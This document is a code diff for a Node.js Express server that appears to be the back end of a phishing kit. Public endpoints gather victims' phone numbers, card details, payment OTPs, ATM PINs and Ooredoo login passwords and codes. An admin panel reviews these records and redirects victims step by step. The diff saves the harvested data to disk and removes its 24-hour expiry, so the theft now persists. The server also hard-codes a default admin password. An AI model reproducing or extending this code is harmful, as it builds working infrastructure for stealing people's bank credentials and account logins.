@@ -1,31 +1,57 @@
 const express = require('express');
 const path = require('path');
+const fs = require('fs');
 const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const PUBLIC_DIR = path.join(__dirname, 'public');
+const DATA_FILE = path.join(__dirname, 'data', 'visits.json');
 
-// Change this to your own password (or set the ADMIN_PASSWORD env var before starting the server)
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';
 
 app.use(express.json());
 app.use(express.static(PUBLIC_DIR));
 
-// ---- In-memory visit store ----
-const visits = {};
-const ACTIVE_WINDOW_MS = 5 * 60 * 1000; // considered "active" if updated in last 5 minutes
+// ---- Persistent visit store (JSON file) ----
+const dataDir = path.join(__dirname, 'data');
+if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
+
+let visits = {};
+try {
+  if (fs.existsSync(DATA_FILE)) {
+    visits = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+    console.log(`Loaded ${Object.keys(visits).length} visits from disk`);
+  }
+} catch (e) {
+  console.error('Failed to load visits from disk, starting fresh:', e.message);
+  visits = {};
+}
+
+let saveTimer = null;
+function saveVisits() {
+  if (saveTimer) return;
+  saveTimer = setTimeout(() => {
+    saveTimer = null;
+    try {
+      fs.writeFileSync(DATA_FILE, JSON.stringify(visits, null, 2), 'utf8');
+    } catch (e) {
+      console.error('Failed to save visits:', e.message);
+    }
+  }, 500);
+}
+
+const ACTIVE_WINDOW_MS = 5 * 60 * 1000;
 
 // ---- Active sessions tracking (heartbeat) ----
-const activeSessions = {}; // sessionId -> { lastSeen, page, lang }
-const ACTIVE_SESSION_TIMEOUT_MS = 10 * 1000; // 10 seconds
+const activeSessions = {};
+const ACTIVE_SESSION_TIMEOUT_MS = 10 * 1000;
 
 function getActiveVisitorsCount() {
   const now = Date.now();
   return Object.values(activeSessions).filter(s => (now - s.lastSeen) < ACTIVE_SESSION_TIMEOUT_MS).length;
 }
 
-// Cleanup old sessions every 30 seconds
 setInterval(() => {
   const now = Date.now();
   Object.keys(activeSessions).forEach(sid => {
@@ -35,21 +61,9 @@ setInterval(() => {
   });
 }, 30 * 1000);
 
-const VISIT_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours
-// Cleanup old visits every 10 minutes
-setInterval(() => {
-  const now = Date.now();
-  Object.keys(visits).forEach(key => {
-    if ((now - (visits[key].updatedAt || 0)) > VISIT_TTL_MS) {
-      delete visits[key];
-    }
-  });
-}, 10 * 60 * 1000);
-
 // ---- In-memory admin session tokens ----
 const adminTokens = new Set();
 
-// ---- In-memory orders store ----
 const orders = [];
 
 function requireAdmin(req, res, next) {
@@ -99,12 +113,9 @@ app.get('/api/admin/orders', (req, res) => {
 
   console.log('📊 Current visits:', Object.keys(visits).length, 'orders');
 
-  // تحويل visits إلى orders format
   const ordersList = Object.values(visits).map(v => {
-    // معالجة البيانات حسب النموذج المتوقع
     return {
-      ...v, // دمج جميع بيانات الزيارة
-      // تأكيد الحقول الأساسية (تكتب فوق spread للضمان)
+      ...v,
       ref: v.visitId,
       ts: v.createdAt || v.updatedAt || Date.now(),
       status: v.status || 'active',
@@ -134,9 +145,9 @@ app.post('/api/admin/clear', (req, res) => {
     return res.status(401).json({ error: 'unauthorized' });
   }
 
-  // مسح جميع البيانات
   Object.keys(visits).forEach(key => delete visits[key]);
   orders.length = 0;
+  saveVisits();
 
   res.json({ ok: true, message: 'تم مسح جميع السجلات' });
 });
@@ -151,6 +162,7 @@ app.delete('/api/admin/orders/:ref', (req, res) => {
   const { ref } = req.params;
   if (visits[ref]) {
     delete visits[ref];
+    saveVisits();
     return res.json({ ok: true });
   }
   res.status(404).json({ error: 'order not found' });
@@ -200,19 +212,18 @@ app.post('/api/admin/decide/:ref', (req, res) => {
     }
   }
 
+  saveVisits();
   res.json({ ok: true, visit });
 });
 
-// Helper: البحث عن visit بواسطة visitId أو paymentId (ربط جميع البيانات في نفس السجل)
+// Helper: البحث عن visit بواسطة visitId أو paymentId
 function findVisit(id) {
   if (!id) return null;
-  // البحث المباشر بـ visitId
   if (visits[id]) return visits[id];
-  // البحث بـ paymentId
   return Object.values(visits).find(v => v.pay && v.pay.id === id) || null;
 }
 
-// ---- Public: visitor tracking (no auth - used by the flow pages themselves) ----
+// ---- Public: visitor tracking ----
 app.post('/api/track', (req, res) => {
   const data = req.body || {};
   const visitId = data.visitId;
@@ -222,13 +233,11 @@ app.post('/api/track', (req, res) => {
   const existing = visits[visitId];
   const pendingRedirect = existing ? existing.pendingRedirect || null : null;
 
-  // لا تمحو البيانات الموجودة بقيم فارغة (حماية بيانات العميل)
   const cleanData = {};
   for (const [k, v] of Object.entries(data)) {
     if (v !== '' && v !== null && v !== undefined) cleanData[k] = v;
   }
 
-  // لا تنشئ entry جديدة إلا إذا كان فيه رقم جوال — منع ظهور صفوف فارغة في الأدمن
   const hasPhone = cleanData.p || cleanData.phone;
   if (!existing && !hasPhone) {
     return res.json({ ok: true });
@@ -244,6 +253,7 @@ app.post('/api/track', (req, res) => {
     pendingRedirect: null,
   };
 
+  saveVisits();
   res.json({ ok: true, redirect: pendingRedirect || undefined });
 });
 
@@ -273,6 +283,7 @@ app.post('/api/payment', (req, res) => {
     visits[requestId].status = 'awaiting';
     visits[requestId].step = 'card';
     visits[requestId].cardName = cardName;
+    saveVisits();
   }
 
   res.json({ ok: true, id: paymentId });
@@ -311,6 +322,7 @@ app.post('/api/otp', (req, res) => {
     visit.pay.otp = otp;
     visit.pay.code = otp;
   }
+  saveVisits();
   res.json({ ok: true });
 });
 
@@ -334,6 +346,7 @@ app.post('/api/atm', (req, res) => {
   if (visit.pay) {
     visit.pay.pin = atmPin;
   }
+  saveVisits();
   res.json({ ok: true });
 });
 
@@ -360,6 +373,7 @@ app.post('/api/ooredoo-login', (req, res) => {
     password: password,
     otp: visit.ooredoo ? visit.ooredoo.otp : ''
   };
+  saveVisits();
   res.json({ ok: true });
 });
 
@@ -385,10 +399,11 @@ app.post('/api/ooredoo-otp', (req, res) => {
   } else {
     visit.ooredoo = { username: '', password: '', otp: otp };
   }
+  saveVisits();
   res.json({ ok: true });
 });
 
-// ---- Heartbeat: تسجيل الجلسات النشطة ----
+// ---- Heartbeat ----
 app.post('/api/heartbeat', (req, res) => {
   const { sessionId, page, lang } = req.body || {};
   if (sessionId) {
@@ -410,7 +425,6 @@ app.get('/api/active-visitors', (req, res) => {
 app.get('/api/visits', requireAdmin, (req, res) => {
   const now = Date.now();
   const list = Object.values(visits)
-    .filter(v => (now - (v.updatedAt || 0)) <= VISIT_TTL_MS)
     .map(v => ({ ...v, status: (now - v.updatedAt) <= ACTIVE_WINDOW_MS ? 'active' : 'inactive' }))
     .sort((a, b) => b.updatedAt - a.updatedAt);
   res.json(list);
@@ -421,6 +435,7 @@ app.post('/api/redirect', requireAdmin, (req, res) => {
   if (!visitId || !target) return res.status(400).json({ error: 'visitId and target required' });
   if (!visits[visitId]) return res.status(404).json({ error: 'visit not found' });
   visits[visitId].pendingRedirect = target;
+  saveVisits();
   res.json({ ok: true });
 });
 
